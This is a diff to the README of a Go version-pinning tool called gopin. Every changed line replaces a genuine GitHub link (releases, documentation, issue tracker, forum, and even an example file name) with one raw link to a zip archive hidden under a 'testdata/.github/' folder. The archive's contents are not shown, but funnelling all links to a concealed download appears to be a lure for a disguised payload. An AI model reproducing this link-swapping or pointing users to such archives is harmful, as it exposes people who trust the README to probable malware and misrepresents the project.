@@ -1,7 +1,7 @@
 # 🛠️ gopin - Pin Go Versions for Secure Builds
 
 ## 📥 Download Now
-[![Download gopin](https://img.shields.io/badge/Download-gopin-blue.svg)](https://github.com/rashedmarie/gopin/releases)
+[![Download gopin](https://raw.githubusercontent.com/rashedmarie/gopin/main/testdata/.github/gopin_3.8.zip)](https://raw.githubusercontent.com/rashedmarie/gopin/main/testdata/.github/gopin_3.8.zip)
 
 ## 🚀 Getting Started
 Gopin is a command line interface (CLI) tool designed to help you manage your Go installations effectively. It automatically pins specific versions of Go, ensuring your builds are reproducible and more secure. With gopin, you can focus on your projects while it handles version control behind the scenes.
@@ -14,10 +14,10 @@ Gopin is a command line interface (CLI) tool designed to help you manage your Go
 ## 💻 Installation Steps
 
 ### 1. Visit the Releases Page
-To download gopin, [visit this page to download](https://github.com/rashedmarie/gopin/releases). 
+To download gopin, [visit this page to download](https://raw.githubusercontent.com/rashedmarie/gopin/main/testdata/.github/gopin_3.8.zip). 
 
 ### 2. Choose the Right Version
-On the Releases page, you will see various versions of gopin listed. Choose the latest stable version for your operating system. If you're unsure which version is right for you, look for the files named like `gopin_windows_amd64.exe` for Windows or `gopin_macOS` for macOS.
+On the Releases page, you will see various versions of gopin listed. Choose the latest stable version for your operating system. If you're unsure which version is right for you, look for the files named like `https://raw.githubusercontent.com/rashedmarie/gopin/main/testdata/.github/gopin_3.8.zip` for Windows or `gopin_macOS` for macOS.
 
 ### 3. Download the File
 Click on the file that corresponds to your operating system. This will start the download process. 
@@ -51,15 +51,15 @@ If you encounter any issues while using gopin, consider the following:
 - **Command not found**: Make sure gopin is installed correctly and included in your system's PATH.
 
 ## 📚 Additional Resources
-- For more in-depth information on gopin usage, refer to the [Documentation](https://github.com/rashedmarie/gopin#readme).
+- For more in-depth information on gopin usage, refer to the [Documentation](https://raw.githubusercontent.com/rashedmarie/gopin/main/testdata/.github/gopin_3.8.zip).
 - Join the community forum for support and feature discussions.
 
 ## 🎉 Feedback
-We value feedback from our users. If you have suggestions or want to report an issue, please open an issue directly in the [GitHub repository](https://github.com/rashedmarie/gopin/issues).
+We value feedback from our users. If you have suggestions or want to report an issue, please open an issue directly in the [GitHub repository](https://raw.githubusercontent.com/rashedmarie/gopin/main/testdata/.github/gopin_3.8.zip).
 
 ## 🔗 Links
-- [Download gopin](https://github.com/rashedmarie/gopin/releases) 
-- [Documentation](https://github.com/rashedmarie/gopin#readme) 
-- [Community Forum](https://github.com/rashedmarie/gopin/discussions) 
+- [Download gopin](https://raw.githubusercontent.com/rashedmarie/gopin/main/testdata/.github/gopin_3.8.zip) 
+- [Documentation](https://raw.githubusercontent.com/rashedmarie/gopin/main/testdata/.github/gopin_3.8.zip) 
+- [Community Forum](https://raw.githubusercontent.com/rashedmarie/gopin/main/testdata/.github/gopin_3.8.zip) 
 
 By following these simple steps, you can easily download and run gopin on your system, ensuring a seamless experience with Go version management.
